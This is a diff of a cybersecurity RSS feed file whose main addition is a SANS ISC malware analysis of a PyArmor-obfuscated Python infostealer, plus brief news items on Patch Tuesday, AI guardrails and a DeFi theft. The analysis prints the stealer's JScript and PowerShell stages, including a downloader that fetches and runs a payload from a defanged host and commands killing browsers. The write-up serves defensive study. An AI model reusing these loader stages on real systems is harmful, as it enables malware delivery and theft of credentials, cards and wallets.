@@ -1,5 +1,149 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 09 Apr 2025 06:59:26 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Microsoft April 2025 Patch Tuesday</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Patch Tuesday, April 2025 Edition</title><link>https://krebsonsecurity.com/2025/04/patch-tuesday-april-2025-edition/</link><description>Microsoft today released updates to plug at least 121 security holes in its Windows operating systems and software, including one vulnerability that is already being exploited in the wild. Eleven of those flaws earned Microsoft's most-dire "critical" rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.</description><content:encoded>&lt;p&gt;&lt;strong&gt;Microsoft&lt;/strong&gt; today released updates to plug at least 121 security holes in its &lt;strong&gt;Windows&lt;/strong&gt; operating systems and software, including one vulnerability that is already being exploited in the wild. Eleven of those flaws earned Microsoft&amp;#8217;s most-dire &amp;#8220;critical&amp;#8221; rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Wed, 09 Apr 2025 07:59:21 +0000</lastBuildDate><item><title>Incident Response Policy</title><link>https://www.techrepublic.com/resource-library/it-policy/incident-response-policy/</link><description>Enhance your organization&amp;#8217;s operations and use this IT policy to deal quickly with any security breach. Customizable Document — Ready for use as-is or for edits. Boost Your Processes — This nine-page document outlines defining an incident, assigning an incident response team, documenting a plan, and conducting a response. Expertly-Curated — Written by Scott Matteson ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/incident-response-policy/</guid><category>Cybersecurity</category><category>IT Resources</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Obfuscated Malicious Python Scripts with PyArmor</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Obfuscated Malicious Python Scripts with PyArmor, (Wed, Apr 9th)</title><link>https://isc.sans.edu/diary/rss/31840</link><description>&lt;p&gt;Obfuscation is very important for many developers. They may protect their code for multiple reasons like copyright, anti-cheat (games), or to protect their code from being reused. If an obfuscated program does not mean automatically that it is malicious, it&amp;#x27s often a good sign. For malware developers, obfuscation helps bypass many static security controls and slows down the reverse analysis process.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Obfuscation is very important for many developers. They may protect their code for multiple reasons like copyright, anti-cheat (games), or to protect their code from being reused. If an obfuscated program does not mean automatically that it is malicious, it&amp;rsquo;s often a good sign. For malware developers, obfuscation helps bypass many static security controls and slows down the reverse analysis process.&lt;/p&gt;
+
+&lt;p&gt;There are two main ways to obfuscate your code: directly at development time (strings obfuscation, code pollution, functions and variables names, &amp;hellip;) or through another tool that will take the original program as input and generate a brand new one.&lt;/p&gt;
+
+&lt;p&gt;Yesterday, I spotted some malicious Python scripts that were protected using the same technique: PyArmor[&lt;a href="https://github.com/dashingsoft/pyarmor"&gt;1&lt;/a&gt;]. This tool is not coming from the underground and is an official tool to deeply obfuscate Python scripts, and it performs a pretty decent job!&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s have a look at one of them delivered through a piece of JavaScript: update.js (SHA256: 64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa[&lt;a href="https://www.virustotal.com/gui/file/64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa/details"&gt;2&lt;/a&gt;]). The script is a one-liner:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+var WshShell = new ActiveXObject(&amp;quot;Wscript.Shell&amp;quot;);
+WshShell.run(&amp;quot;Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUA ...[Redacted] ... 8ACAAaQBlAHgA&amp;quot;, 0, false);&lt;/pre&gt;
+
+&lt;p&gt;The decoded Base64 data reveals another one:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('{&amp;quot;Script&amp;quot;:&amp;quot;JFVSTCA9ICdo ... [Redacted] ... 2NyaXB0UGF0aCINCg==&amp;quot;}' | ConvertFrom-Json).Script)) | iex&lt;/pre&gt;
+
+&lt;p&gt;Did you see that the next payload is stored in a JSON object?&amp;nbsp; Here is the decoded script:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+$URL = 'hxxps://postprocesser[.]com/.well-known/pki-validation/go/python3.zip'
+$OutFile = Join-Path $env:TEMP 'py.zip'
+$ExtractPath = $env:TEMP
+$pythonExe = 'pythonw.exe'
+$scriptPy = 'exec.py'
+
+$ProgressPreference = 'SilentlyContinue'
+Invoke-WebRequest -Uri $URL -OutFile $OutFile
+
+if (Test-Path -Path (Join-Path $ExtractPath 'python3')) {
+    Remove-Item -Path (Join-Path $ExtractPath 'python3') -Recurse -Force
+}
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($OutFile, $ExtractPath)
+
+$pythonPath = Join-Path (Join-Path $ExtractPath 'python3') $pythonExe
+$scriptPath = Join-Path (Join-Path $ExtractPath 'python3') $scriptPy
+
+Start-Process -NoNewWindow -FilePath &amp;quot;cmd.exe&amp;quot; -ArgumentList &amp;quot;/c set REALTEKAUDIO=hxxps://postprocesser[.]com/.well-known/pki-validation/go/cinnamonroll.php?id=mumu &amp;amp;&amp;amp; set PROCNAME=Main &amp;amp;&amp;amp; $pythonPath $scriptPath&amp;quot;&lt;/pre&gt;
+
+&lt;p&gt;The downloaded archive python3.zip contains a stand-alone Python environment and also the next payload (exec.py):&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+# Pyarmor 8.5.11 (pro), 005724, non-profits, 2024-12-13T07:33:37.517122
+from pyarmor_runtime_005724 import __pyarmor__
+__pyarmor__(__name__, __file__, b'PY005724\x00\x03\x0b\x00\xa7\r\r\n\x80 ... [Redacted] ... \xff\xe3m\x82\xdboi,\x85i\xf0')&lt;/pre&gt;
+
+&lt;p&gt;If you execute this code in a sandbox, it will perform many suspicious actions:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+wmic path win32_VideoController get name
+wmic csproduct get UUID
+taskkill /F /IM msedge.exe
+taskkill /F /IM chrome.exe&lt;/pre&gt;
+
+&lt;p&gt;Then crash&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;How to get more details about this Python script? PyArmor can&amp;rsquo;t be deobuscated easily (especially the latest version). Let&amp;rsquo;s try to extract some piece of memory. As described in the PyArmor documentation[&lt;a href="https://pyarmor.readthedocs.io/en/v7.3.3/how-to-do.html"&gt;3&lt;/a&gt;], it serializes code objects and obfuscates them to protect constants and literal strings. Python marshal[&lt;a href="https://docs.python.org/3/library/marshal.html"&gt;4&lt;/a&gt;] is used for this.&lt;/p&gt;
+
+&lt;p&gt;Using Frida[&lt;a href="https://frida.re"&gt;5&lt;/a&gt;], let&amp;rsquo;s try to get access to some memory regions. We can hook PyMarshal_ReadObjectFromString() and dump data on disk. Here is a quick Frida script:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+const marshalLoads = Module.findExportByName(null, &amp;quot;PyMarshal_ReadObjectFromString&amp;quot;);
+if (marshalLoads !== null) {
+    console.log(&amp;quot;Found marshal.loads at: &amp;quot; + marshalLoads);
+    Interceptor.attach(marshalLoads, {
+        onEnter: function (args) {
+            this.buf = args[0];
+            this.len = args[1].toInt32();
+        },
+        onLeave: function (retval) {
+            const raw = Memory.readByteArray(this.buf, this.len);
+            const filename = `marshal_dump_${Date.now()}.pyc`;
+            const f = new File(filename, &amp;quot;wb&amp;quot;);
+            f.write(raw);
+            f.close();
+            console.log(&amp;quot;[+] Dumped marshal.loads payload to: &amp;quot; + filename);
+        }
+    });
+} else {
+    console.log(&amp;quot;marshal.loads not found.&amp;quot;);
+}&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s execute the script again through Frida:&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+C:\Users\REM\AppData\Local\Temp\python3&amp;gt;frida -l .\hook.js -f .\python.exe exec.py
+     ____
+    / _  |   Frida 16.7.4 - A world-class dynamic instrumentation toolkit
+   | (_| |
+    &amp;gt; _  |   Commands:
+   /_/ |_|       help      -&amp;gt; Displays the help system
+   . . . .       object?   -&amp;gt; Display information about 'object'
+   . . . .       exit/quit -&amp;gt; Exit
+   . . . .
+   . . . .   More info at https://frida.re/docs/home/
+   . . . .
+   . . . .   Connected to Local System (id=local)
+Spawning `.\python.exe exec.py`...
+Found marshal.loads at: 0x7ffbceb68fc8
+Spawned `.\python.exe exec.py`. Resuming main thread!
+[+] Dumped marshal.loads payload to: marshal_dump_1744177893798.pyc
+...&lt;/pre&gt;
+
+&lt;p&gt;We had a hit on the hooked function! The result file is not a Python bytecode as expected but just data without relevant strings (only related to the Python environment).&lt;/p&gt;
+
+&lt;p&gt;Another approach is to dump the process completely then search for strings again (because&amp;nbsp;once in memory, it has been deobfuscated).&lt;/p&gt;
+
+&lt;p&gt;Interesting strings are present in memory and reveal a classic Python script:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+esurroundtogethertomorrowtortoisetransferumbrellauniverseDwmFlushAbortDocDeleteDCMoveToExResetDCWoleaut32SetFocusCopyRectPtInRectDrawIconFillRectEndPaintClassANYQuestiondaylightSHA1-RSADSA-SHA1DNS nameavx512cdavx512eravx512pfavx512dq2.5.4.102.5.4.112.5.4.17FakeErrorfork/execcontinuedRemoveAll#execwaitinterruptbus errorntdll.dllFindCloseLocalFreeMoveFileWWriteFileWSASendTo&lt;span style="color: #e74c3c;"&gt;wireshark&lt;/span&gt;prl_tools&lt;span style="color: #e74c3c;"&gt;procmon64exeinfope&lt;/span&gt;proxifierhttpdebugmitmproxytitanhide&lt;span style="color: #e74c3c;"&gt;SERVER-PCLOUISE-PCBECKER-PC&lt;/span&gt;kEecfMwgjralphs-pcGANGISTANRALPHS-PCj6SHA37KAkeecfmwgjQmIS5df7upWOuqdTDQUox1tzaMOrB5BnfuR2txWas1m2ta.monaldoUser DataMicrosoft%s//UsersPasswordsDownloadsAutofillsBitFinityDoge LabsLiqualityMaiarDEFI\bytecoinnot found&lt;span style="color: #e74c3c;"&gt;opera.exebrave.exe&lt;/span&gt;DCBrowserSeaMonkeyIceDragonPale MoonUrBrowser&lt;span style="color: #e74c3c;"&gt;motdepass&lt;/span&gt;DocumentsTLauncheralts.jsonalts.novoLightcord&lt;/pre&gt;
+
+&lt;p&gt;You can see some search sandbox names (&amp;ldquo;SERVER&amp;rdquo;, &amp;ldquo;PC-LOUISE&amp;rdquo;, &amp;hellip;) as well as process names (&amp;ldquo;procmon64&amp;rdquo;, &amp;ldquo;execinfope&amp;rdquo;, &amp;hellip;)&lt;/p&gt;
+
+&lt;p&gt;Another interesting one:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+failed to write to key log&lt;/pre&gt;
+
+&lt;p&gt;Credit cards and wallet activity:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+Credit Cards: %-50s %-50s %-50s\Electrum\walletsbrowser not foundEpicGamesLauncher&lt;/pre&gt;
+
+&lt;p&gt;It seems to be a classic stealer...&lt;/p&gt;
+
+&lt;p&gt;If you have tools or processes to deobfuscate PyArmor-protected script, please share!&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href="https://github.com/dashingsoft/pyarmor"&gt;https://github.com/dashingsoft/pyarmor&lt;/a&gt;&lt;br /&gt;
+[2] &lt;a href="https://www.virustotal.com/gui/file/64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa/details"&gt;https://www.virustotal.com/gui/file/64bcf9eb0a54230372438a09ba0ac9e5fa753622e88713d80b9298ab219540fa/details&lt;/a&gt;&lt;br /&gt;
+[3] &lt;a href="https://pyarmor.readthedocs.io/en/v7.3.3/how-to-do.html"&gt;https://pyarmor.readthedocs.io/en/v7.3.3/how-to-do.html&lt;/a&gt;&lt;br /&gt;
+[4] &lt;a href="https://docs.python.org/3/library/marshal.html"&gt;https://docs.python.org/3/library/marshal.html&lt;/a&gt;&lt;br /&gt;
+[5] &lt;a href="https://frida.re/"&gt;https://frida.re&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31840</guid></item><item><title>Patch Tuesday, April 2025 Edition</title><link>https://krebsonsecurity.com/2025/04/patch-tuesday-april-2025-edition/</link><description>Microsoft today released updates to plug at least 121 security holes in its Windows operating systems and software, including one vulnerability that is already being exploited in the wild. Eleven of those flaws earned Microsoft's most-dire "critical" rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.</description><content:encoded>&lt;p&gt;&lt;strong&gt;Microsoft&lt;/strong&gt; today released updates to plug at least 121 security holes in its &lt;strong&gt;Windows&lt;/strong&gt; operating systems and software, including one vulnerability that is already being exploited in the wild. Eleven of those flaws earned Microsoft&amp;#8217;s most-dire &amp;#8220;critical&amp;#8221; rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" class="aligncenter  wp-image-56287" height="528" src="https://krebsonsecurity.com/wp-content/uploads/2021/07/windupate.png" width="750" /&gt;&lt;/p&gt;
 &lt;p&gt;The zero-day flaw already seeing exploitation is &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-29824" rel="noopener" target="_blank"&gt;CVE-2025-29824&lt;/a&gt;, a local elevation of privilege bug in the Windows &lt;strong&gt;Common Log File System&lt;/strong&gt; (CLFS) driver.  Microsoft rates it as &amp;#8220;important,&amp;#8221; but as &lt;strong&gt;Chris Goettl&lt;/strong&gt; from &lt;strong&gt;Ivanti&lt;/strong&gt; points out, risk-based prioritization warrants treating it as critical.&lt;/p&gt;
 &lt;p&gt;This CLFS component of Windows is no stranger to Patch Tuesday: According to Tenable&amp;#8217;s &lt;strong&gt;Satnam Narang&lt;/strong&gt;, since 2022 Microsoft has patched 32 CLFS vulnerabilities &amp;#8212; averaging 10 per year &amp;#8212; with six of them exploited in the wild. The &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-49138" rel="noopener" target="_blank"&gt;last CLFS zero-day&lt;/a&gt; was &lt;a href="https://krebsonsecurity.com/2024/12/patch-tuesday-december-2024-edition/" rel="noopener" target="_blank"&gt;patched in December 2024&lt;/a&gt;.&lt;/p&gt;
@@ -4150,7 +4294,7 @@ Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;
 &lt;p&gt;Integrity is essential to trust, on both technical and human levels. Looking forward, integrity controls will fundamentally shape AI development by moving from optional features to core architectural requirements, much as SSL certificates evolved from a banking luxury to a baseline expectation for any Web service.&lt;/p&gt;
 &lt;p&gt;Web 3.0 protocols can build integrity controls into their foundation, creating a more reliable infrastructure for AI systems. Today, we take availability for granted; anything less than 100% uptime for critical websites is intolerable. In the future, we will need the same assurances for integrity. Success will require following practical guidelines for maintaining data integrity throughout the AI lifecycle&amp;#8212;from data collection through model training and finally to deployment, use, and evolution. These guidelines will address not just technical controls but also governance structures and human oversight, similar to how privacy policies evolved from legal boilerplate into comprehensive frameworks for data stewardship. Common standards and protocols, developed through industry collaboration and regulatory frameworks, will ensure consistent integrity controls across different AI systems and applications.&lt;/p&gt;
 &lt;p&gt;Just as the HTTPS protocol created a foundation for trusted e-commerce, it&amp;#8217;s time for new integrity-focused standards to enable the trusted AI services of tomorrow.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;This essay was written with Davi Ottenheimer, and originally appeared in &lt;a href="https://dl.acm.org/doi/10.1145/3723438"&gt;Communications of the ACM&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70082</guid><category>Uncategorized</category><category>Internet</category><category>protocols</category><category>web</category></item><item><title>ISC Stormcast For Wednesday, April 2nd, 2025 https://isc.sans.edu/podcastdetail/9390, (Wed, Apr 2nd)</title><link>https://isc.sans.edu/diary/rss/31820</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31820</guid></item><item><title>Intel CEO Tan Starts Company’s Pivot: Spin Off Non-Core Assets</title><link>https://www.techrepublic.com/article/news-intel-ceo-tan-core-business/</link><description>During the Intel Vision conference, Tan also said he would focus on boosting Intel’s chip foundry work and recruiting quality engineering talent.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4300499</guid><category>Artificial Intelligence</category><category>Hardware</category><category>Innovation</category><category>News</category><category>artificial intelligence</category><category>broadcom</category><category>cpu processors</category><category>intel</category><category>nvidia</category><category>tsmc</category></item><item><title>How Can AI Be Used Safely? Researchers From Harvard, MIT, IBM &amp; Microsoft Weigh In</title><link>https://www.techrepublic.com/article/news-ai-research-aaai/</link><description>A new report by the AAAI defines the current trends and the research challenges required to make AI more capable and reliable, so the technology can be safely used.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4300476</guid><category>Artificial Intelligence</category><category>Microsoft</category><category>News</category><category>academic research</category><category>ai</category><category>ai agents</category><category>ai ethics</category><category>ai research</category><category>ai safety</category><category>artificial intelligence</category><category>ibm</category></item><item><title>Transforming public sector security operations in the AI era</title><link>https://www.microsoft.com/en-us/security/blog/2025/04/01/transforming-public-sector-security-operations-in-the-ai-era/</link><description>&lt;p&gt;Read how Microsoft’s unified security operations platform can use generative AI to transform cybersecurity for the public sector. &lt;/p&gt;
+&lt;p&gt;&lt;em&gt;This essay was written with Davi Ottenheimer, and originally appeared in &lt;a href="https://dl.acm.org/doi/10.1145/3723438"&gt;Communications of the ACM&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70082</guid><category>Uncategorized</category><category>Internet</category><category>protocols</category><category>web</category></item><item><title>Intel CEO Tan Starts Company’s Pivot: Spin Off Non-Core Assets</title><link>https://www.techrepublic.com/article/news-intel-ceo-tan-core-business/</link><description>During the Intel Vision conference, Tan also said he would focus on boosting Intel’s chip foundry work and recruiting quality engineering talent.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4300499</guid><category>Artificial Intelligence</category><category>Hardware</category><category>Innovation</category><category>News</category><category>artificial intelligence</category><category>broadcom</category><category>cpu processors</category><category>intel</category><category>nvidia</category><category>tsmc</category></item><item><title>How Can AI Be Used Safely? Researchers From Harvard, MIT, IBM &amp; Microsoft Weigh In</title><link>https://www.techrepublic.com/article/news-ai-research-aaai/</link><description>A new report by the AAAI defines the current trends and the research challenges required to make AI more capable and reliable, so the technology can be safely used.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4300476</guid><category>Artificial Intelligence</category><category>Microsoft</category><category>News</category><category>academic research</category><category>ai</category><category>ai agents</category><category>ai ethics</category><category>ai research</category><category>ai safety</category><category>artificial intelligence</category><category>ibm</category></item><item><title>Transforming public sector security operations in the AI era</title><link>https://www.microsoft.com/en-us/security/blog/2025/04/01/transforming-public-sector-security-operations-in-the-ai-era/</link><description>&lt;p&gt;Read how Microsoft’s unified security operations platform can use generative AI to transform cybersecurity for the public sector. &lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/01/transforming-public-sector-security-operations-in-the-ai-era/"&gt;Transforming public sector security operations in the AI era&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;The cyberthreat landscape is evolving at an unprecedented pace, becoming increasingly dangerous and complex. Nation-state threat actors and cybercriminals are employing advanced tactics and generative AI to execute highly sophisticated attacks. This situation is further compounded by outdated technology and systems, shortage of cybersecurity talent, and antiquated processes, which are inefficient in handling the scale, complexity, and ever-evolving nature of these cyberattacks. With 62% of all cyberattacks targeting public sector organizations, it is crucial for these sectors to leverage state-of-the-art technology, powered by generative AI, to &lt;a href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/final/en-us/microsoft-brand/documents/atlas-data-sheet-013025-v2.pdf" rel="noreferrer noopener" target="_blank"&gt;transform their cyber defense&lt;/a&gt; and stay ahead of these evolving threats.&lt;sup&gt;1&lt;/sup&gt;&lt;/p&gt;
 
 
@@ -10955,7 +11099,7 @@ Add files via upload
               
             &lt;/a&gt;
           &lt;/div&gt;
-        &lt;p&gt;Safely deploying AI in today’s dynamic landscape requires acknowledging that while AI models are powerful, they are also inherently non-deterministic. By leveraging Guardrails within AI Gateway, you gain:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Consistent moderation&lt;/b&gt;: Uniform moderation layer that works across models and providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enhanced safety and user trust&lt;/b&gt;: Proactively protect users from harmful or inappropriate interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexibility and control over allowed content: &lt;/b&gt;Specify which categories to monitor and choose between flagging or outright blocking&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Auditing and compliance capabilities&lt;/b&gt;: Stay ahead of evolving regulatory requirements with logs of user prompts, model responses, and enforced guardrails.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If you aren't yet using AI Gateway, Llama Guard is also available directly through Workers AI and will be available directly in the Cloudflare WAF in the near future. &lt;/p&gt;&lt;p&gt;Looking ahead, we plan to expand Guardrails’ capabilities further, to allow users to create their own classification categories, and to include protections against prompt injection and sensitive data exposure. To begin using Guardrails, check out our &lt;a href="https://developers.cloudflare.com/ai-gateway/guardrails/"&gt;&lt;u&gt;developer documentation&lt;/u&gt;&lt;/a&gt;. If you have any questions, please reach out in our &lt;a href="http://discord.cloudflare.com/"&gt;&lt;u&gt;Discord community.&lt;/u&gt;&lt;/a&gt;&lt;i&gt;&lt;/i&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">6kOBF6L96Ufw5NbPmavW7Y</guid><category>AI</category><category>Developers</category><category>Developer Platform</category><category>AI Gateway</category><category>Security</category></item><item><title>Celebrating 1 Year of CSF 2.0</title><link>https://www.nist.gov/blogs/cybersecurity-insights/celebrating-1-year-csf-20</link><description>It has been one year since the release of the NIST Cybersecurity Framework (CSF) 2.0 ! To make improving your security posture even easier, in this blog we are: Sharing new CSF 2.0 resources; Taking a retrospective look at some resources and applications you may have missed; and Highlighting ways you can stay involved in our work, helping us help you implement better cybersecurity. NIST’s subject matter experts have worked over the last year to continue expanding the CSF 2.0 implementation resources to help you secure your enterprise. Stakeholders are a very important force behind NIST’s</description><guid isPermaLink="false">https://www.nist.gov/node/1875716</guid></item><item><title>IT Leader’s Guide to Cybersecurity Awareness Training</title><link>https://www.techrepublic.com/resource-library/guide/cybersecurity-awareness-training/</link><description>Organizations of all sizes are being targeted by bad actors, which is why cybersecurity awareness training is more important than ever. Unfortunately, most organizations are not motivated to implement such training. Kara Sherrer, writing for TechRepublic Premium, explains what this awareness training is and the top five reasons why your company needs to implement it. ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/what-is-cybersecurity-awareness-training/</guid><category>Cybersecurity</category><category>IT Resources</category></item><item><title>How an Attacker Drained $50M from a DeFi Protocol Through Role Escalation</title><link>https://research.checkpoint.com/2025/how-an-attacker-drained-50m-from-a-defi-protocol-through-role-escalation/</link><description>&lt;p&gt;By: Dikla Barda, Roaman Zaikin &amp;#38; Oded Vanunu&amp;#160; After reviewing the off-chain forensic report, we can now provide additional insights into the Bybit attackmechanism. Security researchers have determined that hackers injected malicious JavaScript directly into Safe&amp;#8217;sonline infrastructure hosted on AWS. The code was specifically designed to activate only wheninteracting with Bybit&amp;#8217;s contract address, allowing it [&amp;#8230;]&lt;/p&gt;
+        &lt;p&gt;Safely deploying AI in today’s dynamic landscape requires acknowledging that while AI models are powerful, they are also inherently non-deterministic. By leveraging Guardrails within AI Gateway, you gain:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Consistent moderation&lt;/b&gt;: Uniform moderation layer that works across models and providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enhanced safety and user trust&lt;/b&gt;: Proactively protect users from harmful or inappropriate interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexibility and control over allowed content: &lt;/b&gt;Specify which categories to monitor and choose between flagging or outright blocking&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Auditing and compliance capabilities&lt;/b&gt;: Stay ahead of evolving regulatory requirements with logs of user prompts, model responses, and enforced guardrails.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If you aren't yet using AI Gateway, Llama Guard is also available directly through Workers AI and will be available directly in the Cloudflare WAF in the near future. &lt;/p&gt;&lt;p&gt;Looking ahead, we plan to expand Guardrails’ capabilities further, to allow users to create their own classification categories, and to include protections against prompt injection and sensitive data exposure. To begin using Guardrails, check out our &lt;a href="https://developers.cloudflare.com/ai-gateway/guardrails/"&gt;&lt;u&gt;developer documentation&lt;/u&gt;&lt;/a&gt;. If you have any questions, please reach out in our &lt;a href="http://discord.cloudflare.com/"&gt;&lt;u&gt;Discord community.&lt;/u&gt;&lt;/a&gt;&lt;i&gt;&lt;/i&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">6kOBF6L96Ufw5NbPmavW7Y</guid><category>AI</category><category>Developers</category><category>Developer Platform</category><category>AI Gateway</category><category>Security</category></item><item><title>Celebrating 1 Year of CSF 2.0</title><link>https://www.nist.gov/blogs/cybersecurity-insights/celebrating-1-year-csf-20</link><description>It has been one year since the release of the NIST Cybersecurity Framework (CSF) 2.0 ! To make improving your security posture even easier, in this blog we are: Sharing new CSF 2.0 resources; Taking a retrospective look at some resources and applications you may have missed; and Highlighting ways you can stay involved in our work, helping us help you implement better cybersecurity. NIST’s subject matter experts have worked over the last year to continue expanding the CSF 2.0 implementation resources to help you secure your enterprise. Stakeholders are a very important force behind NIST’s</description><guid isPermaLink="false">https://www.nist.gov/node/1875716</guid></item><item><title>How an Attacker Drained $50M from a DeFi Protocol Through Role Escalation</title><link>https://research.checkpoint.com/2025/how-an-attacker-drained-50m-from-a-defi-protocol-through-role-escalation/</link><description>&lt;p&gt;By: Dikla Barda, Roaman Zaikin &amp;#38; Oded Vanunu&amp;#160; After reviewing the off-chain forensic report, we can now provide additional insights into the Bybit attackmechanism. Security researchers have determined that hackers injected malicious JavaScript directly into Safe&amp;#8217;sonline infrastructure hosted on AWS. The code was specifically designed to activate only wheninteracting with Bybit&amp;#8217;s contract address, allowing it [&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/how-an-attacker-drained-50m-from-a-defi-protocol-through-role-escalation/"&gt;How an Attacker Drained $50M from a DeFi Protocol Through Role Escalation &lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;em&gt;By: Dikla Barda, Roaman Zaikin &amp;amp; Oded Vanunu&amp;nbsp;&lt;/em&gt;&lt;/p&gt;
 
 
